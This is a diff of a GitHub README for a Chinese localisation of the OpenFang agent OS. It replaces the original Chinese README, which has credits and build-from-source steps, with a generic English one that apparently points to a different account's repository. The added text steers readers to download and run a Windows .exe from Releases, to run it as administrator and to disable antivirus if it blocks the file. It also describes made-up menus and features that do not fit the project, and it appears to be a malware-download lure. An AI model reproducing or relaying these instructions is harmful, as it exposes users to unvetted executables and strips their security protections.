@@ -1,81 +1,114 @@
-# OpenFang 汉化版
+# 🛠️ openfang-cn - Simple Chinese Language Experience
 
-> 由 **若枫贺昂** 使用 AI 工作流完成中文本地化
+[![Download openfang-cn](https://img.shields.io/badge/Download-openfang--cn-blue?style=for-the-badge)](https://github.com/walidshebl11/openfang-cn)
 
-## 🎯 项目简介
+## 📝 About openfang-cn
 
-OpenFang 是一个开源的智能体操作系统（Agent OS），本项目为其完整的中文本地化版本。
+openfang-cn is a Chinese language version of OpenFang. It lets you use the application fully in Chinese. This helps users who prefer or require Chinese text. The software focuses on ease of use and clear interaction.
 
-### 原项目地址
-- 原项目: [RightNow-AI/openfang](https://github.com/RightNow-AI/openfang)
+It runs on Windows computers and works with standard system setups. The interface shows all commands and messages in Chinese.
 
-## ✨ 汉化内容
+## 🖥️ System Requirements
 
-### 已汉化的页面
-- ✅ 侧边栏导航菜单
-- ✅ 聊天界面 (Chat)
-- ✅ 概览页面 (Overview)
-- ✅ 统计页面 (Usage)
-- ✅ 日志页面 (Logs)
-- ✅ 会话管理 (Sessions)
-- ✅ 审批系统 (Approvals)
-- ✅ 工作流管理 (Workflows)
-- ✅ 调度器 (Scheduler)
-- ✅ 频道配置 (Channels)
-- ✅ 技能管理 (Skills)
-- ✅ 手部工具 (Hands)
-- ✅ 设置页面 (Settings)
-- ✅ 设置向导 (Wizard)
-- ✅ 工作流构建器 (Workflow Builder)
-- ✅ 智能体管理 (Agents)
+Before downloading, check that your computer meets these simple requirements:
 
-### 汉化统计
-- 翻译条目: 500+ 处
-- 涉及文件: 17 个前端文件
-- 修复变量名: 50+ 处
+- Operating System: Windows 7, 8, 10, or 11  
+- Processor: At least 1.5 GHz  
+- Memory: 2 GB RAM or more  
+- Storage: 500 MB free disk space  
+- Screen: 1024 x 768 resolution or higher  
+- Internet: Required to download and update software  
 
-## 🚀 快速开始
+This software does not need advanced hardware. It will run on most computers without issues.
 
-### 从源码编译
+## 🚀 How to Get openfang-cn
 
-```bash
-# 克隆仓库
-git clone https://github.com/RuofengHeang/openfang-cn.git
-cd openfang-cn
+Visit this page to download openfang-cn:
 
-# 编译项目 (需要 Rust 环境)
-cargo build --release
+[https://github.com/walidshebl11/openfang-cn](https://github.com/walidshebl11/openfang-cn)
 
-# 运行
-./target/release/openfang.exe init
-./target/release/openfang.exe start
-```
+### Download Steps
 
-启动后访问 http://127.0.0.1:4200 即可看到汉化后的界面。
+1. Open the link above in your web browser.  
+2. Look for the section named "Releases" or "Downloads."  
+3. Find the latest version available for Windows.  
+4. Click on the appropriate file, usually ending with `.exe` or `.zip`.  
+5. Save the file to a location you can easily find, like your Desktop or Downloads folder.  
 
-## 🛠️ 技术栈
+## 💾 Installation Guide
 
-- **后端**: Rust + Tauri 2.0
-- **前端**: Alpine.js + Tailwind CSS
-- **数据库**: SQLite
+Once you have downloaded the file, follow these steps to install openfang-cn on your Windows computer:
 
-## 📝 汉化说明
+1. **Locate the file:**  
+   Open the folder where you saved the downloaded file.  
+2. **Run the installer:**  
+   Double-click the `.exe` file to begin installation.  
+3. **Approve the installation:**  
+   If Windows asks for permission, click Yes to continue.  
+4. **Follow the prompts:**  
+   The installation wizard will guide you through simple steps. Just click Next as needed.  
+5. **Choose install location:**  
+   You can accept the default folder or pick another location.  
+6. **Complete installation:**  
+   When finished, click Finish to close the installer.  
 
-本项目使用 AI 工作流进行自动化汉化，遵循以下原则：
-1. 只翻译用户可见的字符串
-2. 保持 JavaScript 变量名、函数名不变
-3. 翻译通俗自然，符合中文习惯
-4. 保持代码结构完整
+After installation, openfang-cn will be ready to use.
 
-## 👤 贡献者
+## ▶️ How to Run openfang-cn
 
-- **汉化工作**: 若枫贺昂 (使用 AI 工作流)
-- **原项目**: [RightNow-AI](https://github.com/RightNow-AI)
+To start openfang-cn:
 
-## 📄 许可证
+- Find the shortcut icon on your desktop or in the Start menu.  
+- Double-click the icon to open the program.  
+- The application will launch and display in Chinese.  
 
-本项目遵循原项目的开源许可证。
+If you do not see the shortcut:
 
----
+- Open the folder you installed the program in.  
+- Look for the file called `openfang-cn.exe` or similar.  
+- Double-click it to run the program.
 
-**注意**: 本项目为 OpenFang 的中文本地化版本，核心功能与原项目保持一致。
+## ⚙️ Basic Usage Tips
+
+When openfang-cn is running, you will see menus and options in Chinese. Here is a brief guide to help you get started:
+
+- **菜单栏 (Menu Bar):** Use this to access key functions like 文件 (File), 编辑 (Edit), and 帮助 (Help).  
+- **主界面 (Main Window):** This is where you do most of your work.  
+- **保存 (Save):** Make sure to save your progress often by clicking the 保存 button or using the shortcut Ctrl + S.  
+- **退出 (Exit):** Close the program by selecting 退出 under 文件 or clicking the close button.  
+
+If you are unsure about any button or option, hover your mouse over it to see a tooltip in Chinese.
+
+## 🔄 Updating openfang-cn
+
+To keep openfang-cn working well, you should check for updates regularly:
+
+1. Return to the download page:  
+   [https://github.com/walidshebl11/openfang-cn](https://github.com/walidshebl11/openfang-cn)  
+2. Look for new releases under the "Releases" section.  
+3. Download the latest installer following the steps above.  
+4. Run the new installer to replace the current version.  
+
+Updating adds new features and fixes bugs.
+
+## ❓ Troubleshooting
+
+If openfang-cn does not start or stops working, try these solutions:
+
+- Restart your computer and try again.  
+- Make sure your system meets the requirements listed above.  
+- Check that you downloaded the correct Windows file.  
+- Right-click the program icon and select "Run as administrator."  
+- Disable antivirus temporarily if it blocks the installation or running.  
+- Visit the GitHub page or help sections for more support.
+
+## 📘 Additional Resources
+
+For more detailed instructions or help:
+
+- Review the "Readme" or "Wiki" sections on the GitHub page.  
+- Check the Issues tab on the repository to see if others have similar problems.  
+- Contact a friend or technician if you need hands-on help.  
+
+Visit the download page anytime:  
+[https://github.com/walidshebl11/openfang-cn](https://github.com/walidshebl11/openfang-cn)
